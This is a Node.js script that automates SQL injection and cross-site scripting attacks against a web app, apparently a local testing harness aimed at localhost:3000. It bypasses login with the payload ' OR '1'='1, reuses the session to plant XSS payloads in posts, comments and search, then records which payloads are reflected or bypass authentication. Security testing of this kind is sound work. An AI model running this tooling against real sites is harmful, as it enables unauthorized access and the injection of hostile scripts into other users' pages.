// attack-metrics/attack-runner.js
// Automated attack runner for XSS, SQLi, and other attacks


const axios = require('axios');
const tough = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const fs = require('fs');
const { getXssPayloads, getSqliPayloads } = require('./attack-payloads');

class AttackRunner {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.results = {
      xss: [],
      sqli: [],
      searchXss: [],
      postXss: [],
      commentXss: [],
      loginSqli: [],
      searchSqli: [],
      errors: []
    };
    // Use a cookie jar for session persistence
    this.cookieJar = new tough.CookieJar();
    this.axios = wrapper(axios.create({ jar: this.cookieJar, withCredentials: true }));
  }
  // Helper to check if logged in (by looking for 'Logout' in /posts/new)
  async isLoggedIn() {
    try {
      const res = await this.axios.get(`${this.baseUrl}/posts/new`);
      const body = res.data && typeof res.data === 'string' ? res.data : '';
      return body.includes('Logout');
    } catch (e) {
      return false;
    }
  }

  async runXSSAttacks() {
    // First, login using SQLi to get a session cookie (persisted in cookie jar)
    const sqliPayload = "' OR '1'='1";
    try {
      const loginBody = new URLSearchParams({ username: sqliPayload, password: sqliPayload });
      await this.axios.post(
        `${this.baseUrl}/login`,
        loginBody,
        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
      );
    } catch (e) {
      this.results.errors.push({type: 'loginSqli', payload: sqliPayload, error: 'SQLi login for XSS failed: ' + e.message});
      // If login fails, XSS attacks will likely fail too
      return;
    }

    const xssPayloads = getXssPayloads();
    for (const payload of xssPayloads) {
      if (!payload || !payload.trim()) continue;
      try {
        // Check if logged in before creating post
        const loggedIn = await this.isLoggedIn();
        if (!loggedIn) {
          this.results.errors.push({type: 'postXss', payload, error: 'Not logged in, cannot create post'});
          continue;
        }
        const body = new URLSearchParams({ title: payload, content: 'XSS test content' });
        // Always include Content-Type header
        const res = await this.axios.post(
          `${this.baseUrl}/posts/new`,
          body,
          { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, maxRedirects: 0, validateStatus: s => s >= 200 && s < 400 }
        );
        let postUrl = null;
        if (res.status === 302 && res.headers['location']) {
          postUrl = res.headers['location'].startsWith('http') ? res.headers['location'] : `${this.baseUrl}${res.headers['location']}`;
        }
        let responseStr = '';
        if (postUrl) {
          const postRes = await this.axios.get(postUrl);
          responseStr = postRes.data && typeof postRes.data === 'string' ? postRes.data : '';
        } else {
          responseStr = res.data && typeof res.data === 'string' ? res.data : '';
        }
        const htmlEncoded = payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/'/g, '&#39;')
          .replace(/"/g, '&quot;');
        if (
          responseStr.includes(payload) ||
          responseStr.includes(htmlEncoded)
        ) {
          this.results.postXss.push({
            payload,
            status: res.status,
            reflected: true,
            responseSnippet: responseStr.substring(0, 300)
          });
        } else {
          this.results.errors.push({
            type: 'postXss',
            payload,
            error: 'Payload not reflected',
            status: res.status,
            responseSnippet: responseStr.substring(0, 300)
          });
        }
      } catch (e) {
        this.results.errors.push({type: 'postXss', payload, error: e.message});
      }
    }
    // Get all post IDs from /posts
    let postIds = [];
    try {
      const postsRes = await this.axios.get(`${this.baseUrl}/posts`);
      const html = postsRes.data && typeof postsRes.data === 'string' ? postsRes.data : '';
      // Extract post IDs from <a href="/posts/123">
      const regex = /<a\s+href=["']\/posts\/(\d+)["']/g;
      let match;
      while ((match = regex.exec(html)) !== null) {
        postIds.push(match[1]);
      }
    } catch (e) {
      this.results.errors.push({type: 'commentXss', payload: null, error: 'Failed to fetch post IDs: ' + e.message});
    }

    for (const payload of xssPayloads) {
      if (!payload || !payload.trim()) continue;
      try {
        // Check if logged in before commenting
        const loggedIn = await this.isLoggedIn();
        if (!loggedIn) {
          this.results.errors.push({type: 'commentXss', payload, error: 'Not logged in, cannot comment'});
          continue;
        }
        if (!postIds.length) {
          this.results.errors.push({type: 'commentXss', payload, error: 'No post IDs found to comment on'});
          continue;
        }
        // For each payload, pick a random postId to comment on
        const postId = postIds[Math.floor(Math.random() * postIds.length)];
        const body = new URLSearchParams({ comment: payload });
        // Always include Content-Type header
        const res = await this.axios.post(
          `${this.baseUrl}/posts/${postId}/comment`,
          body,
          { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, maxRedirects: 0, validateStatus: s => s >= 200 && s < 400 }
        );
        let commentUrl = null;
        if (res.status === 302 && res.headers['location']) {
          commentUrl = res.headers['location'].startsWith('http') ? res.headers['location'] : `${this.baseUrl}${res.headers['location']}`;
        } else {
          commentUrl = `${this.baseUrl}/posts/${postId}`;
        }
        let responseStr = '';
        if (commentUrl) {
          const commentRes = await this.axios.get(commentUrl);
          responseStr = commentRes.data && typeof commentRes.data === 'string' ? commentRes.data : '';
        } else {
          responseStr = res.data && typeof res.data === 'string' ? res.data : '';
        }
        const htmlEncoded = payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/'/g, '&#39;')
          .replace(/"/g, '&quot;');
        if (
          responseStr.includes(payload) ||
          responseStr.includes(htmlEncoded)
        ) {
          this.results.commentXss.push({
            payload,
            postId,
            status: res.status,
            reflected: true,
            responseSnippet: responseStr.substring(0, 300)
          });
        } else {
          this.results.errors.push({
            type: 'commentXss',
            payload,
            postId,
            error: 'Payload not reflected',
            status: res.status,
            responseSnippet: responseStr.substring(0, 300)
          });
        }
      } catch (e) {
        this.results.errors.push({type: 'commentXss', payload, error: e.message});
      }
    }
    for (const payload of xssPayloads) {
      if (!payload || !payload.trim()) continue;
      try {
        const res = await this.axios.get(
          `${this.baseUrl}/search?q=${encodeURIComponent(payload)}`
        );
        const responseStr = res.data && typeof res.data === 'string' ? res.data : '';
        const encoded = encodeURIComponent(payload);
        const htmlEncoded = payload.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
        if (
          responseStr.includes(payload) ||
          responseStr.includes(encoded) ||
          responseStr.includes(htmlEncoded)
        ) {
          this.results.searchXss.push({
            payload,
            status: res.status,
            reflected: true,
            responseSnippet: responseStr.substring(0, 300)
          });
        } else {
          this.results.errors.push({
            type: 'searchXss',
            payload,
            error: 'Payload not reflected',
            status: res.status,
            responseSnippet: responseStr.substring(0, 300)
          });
        }
      } catch (e) {
        this.results.errors.push({type: 'searchXss', payload, error: e.message});
      }
    }
  }

  async runSQLiAttacks() {
    const sqlPayloads = getSqliPayloads();
    for (const payload of sqlPayloads) {
      try {
        const body = new URLSearchParams({ username: payload, password: payload });
        const res = await axios.post(
          `${this.baseUrl}/login`,
          body,
          { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        // Heuristic: If login is bypassed, response does not contain 'Invalid credentials'
        if (res.data && typeof res.data === 'string' && !res.data.includes('Invalid credentials')) {
          this.results.loginSqli.push({
            payload,
            status: res.status,
            bypassed: true,
            responseSnippet: res.data.substring(0, 300)
          });
        } else {
          this.results.errors.push({
            type: 'loginSqli',
            payload,
            error: 'Login not bypassed',
            status: res.status,
            responseSnippet: res.data && typeof res.data === 'string' ? res.data.substring(0, 300) : ''
          });
        }
      } catch (e) {
        this.results.errors.push({type: 'loginSqli', payload, error: e.message});
      }
    }
    for (const payload of sqlPayloads) {
      try {
        const res = await axios.get(`${this.baseUrl}/search?q=${encodeURIComponent(payload)}`);
        // Heuristic: Look for SQL error or payload reflected
        if (res.data && typeof res.data === 'string' && (res.data.match(/sql/i) || res.data.includes(payload))) {
          this.results.searchSqli.push({
            payload,
            status: res.status,
            evidence: true,
            responseSnippet: res.data.substring(0, 300)
          });
        } else {
          this.results.errors.push({
            type: 'searchSqli',
            payload,
            error: 'No SQLi evidence',
            status: res.status,
            responseSnippet: res.data && typeof res.data === 'string' ? res.data.substring(0, 300) : ''
          });
        }
      } catch (e) {
        this.results.errors.push({type: 'searchSqli', payload, error: e.message});
      }
    }
  }

  async runAllAttacks() {
    await this.runSQLiAttacks();
    await this.runXSSAttacks();
    return this.generateReport();
  }

  generateReport() {
    const timestamp = new Date().toISOString();
    const report = {
      attackTime: timestamp,
      results: this.results
    };
    fs.writeFileSync(`./reports/attack-${timestamp}.json`, JSON.stringify(report, null, 2));
    return report;
  }
}

if (require.main === module) {
  const runner = new AttackRunner('http://localhost:3000');
  runner.runAllAttacks().then(report => {
    console.log('Attack report generated:', report);
  });
}

module.exports = AttackRunner;
